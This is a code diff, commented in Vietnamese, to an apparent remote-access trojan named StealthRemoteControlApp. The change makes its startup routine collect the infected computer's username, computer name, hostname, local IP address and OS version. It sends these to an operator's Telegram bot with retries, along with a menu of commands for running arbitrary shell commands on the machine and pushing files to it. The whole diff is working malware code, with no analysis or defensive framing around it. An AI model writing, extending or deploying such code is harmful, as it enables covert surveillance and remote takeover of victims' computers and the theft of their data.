@@ -144,18 +144,57 @@ class StealthRemoteControlApp:
         
         # Gửi thông báo Machine ID khi khởi động
         def send_startup_notification():
-            time.sleep(5)  # Đợi 5 giây để đảm bảo bot đã sẵn sàng
-            try:
-                message = f"🖥️ MÁY TÍNH ĐÃ KẾT NỐI\n\n"
-                message += f"🆔 Machine ID: {self.machine_id}\n"
-                message += f"🔖 Short ID: {self.machine_short_id}\n"
-                message += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                message += f"📋 Sử dụng lệnh:\n"
-                message += f"• /cmd {self.machine_short_id} <command> - Thực thi lệnh\n"
-                message += f"• /send {self.machine_short_id} - Gửi file đến máy này\n"
-                self.telegram.send_text_sync(message)
-            except:
-                pass
+            # Đợi bot sẵn sàng và có internet
+            max_retries = 10
+            retry_count = 0
+            while retry_count < max_retries:
+                try:
+                    time.sleep(3)  # Đợi 3 giây mỗi lần thử
+                    if self.telegram.bot:
+                        # Lấy thông tin hệ thống
+                        import socket
+                        import platform
+                        hostname = socket.gethostname()
+                        username = os.environ.get('USERNAME', 'Unknown')
+                        computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
+                        
+                        # Lấy IP address
+                        ip_address = "Unknown"
+                        try:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            s.connect(("8.8.8.8", 80))
+                            ip_address = s.getsockname()[0]
+                            s.close()
+                        except:
+                            pass
+                        
+                        # Tạo thông báo chi tiết
+                        message = f"🟢 MÁY TÍNH MỚI KẾT NỐI THÀNH CÔNG!\n\n"
+                        message += f"🆔 Machine ID: {self.machine_id}\n"
+                        message += f"🔖 Short ID: {self.machine_short_id}\n"
+                        message += f"⏰ Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                        message += f"👤 THÔNG TIN MÁY:\n"
+                        message += f"• Username: {username}\n"
+                        message += f"• Computer Name: {computer_name}\n"
+                        message += f"• Hostname: {hostname}\n"
+                        message += f"• IP Address: {ip_address}\n"
+                        message += f"• OS: {platform.system()} {platform.release()}\n\n"
+                        message += f"📋 LỆNH ĐIỀU KHIỂN:\n"
+                        message += f"• /cmd {self.machine_short_id} <command> - Thực thi lệnh\n"
+                        message += f"• /send {self.machine_short_id} - Gửi file đến máy này\n"
+                        message += f"• /info {self.machine_short_id} - Xem thông tin hệ thống\n"
+                        
+                        # Gửi thông báo
+                        success = self.telegram.send_text_sync(message)
+                        if success:
+                            print(f"[INFO] Đã gửi thông báo kết nối thành công!")
+                            return
+                except Exception as e:
+                    pass
+                retry_count += 1
+            
+            # Nếu không gửi được sau nhiều lần thử, thử lại sau
+            print(f"[WARNING] Không thể gửi thông báo kết nối, sẽ thử lại sau...")
         
         threading.Thread(target=send_startup_notification, daemon=True).start()
         
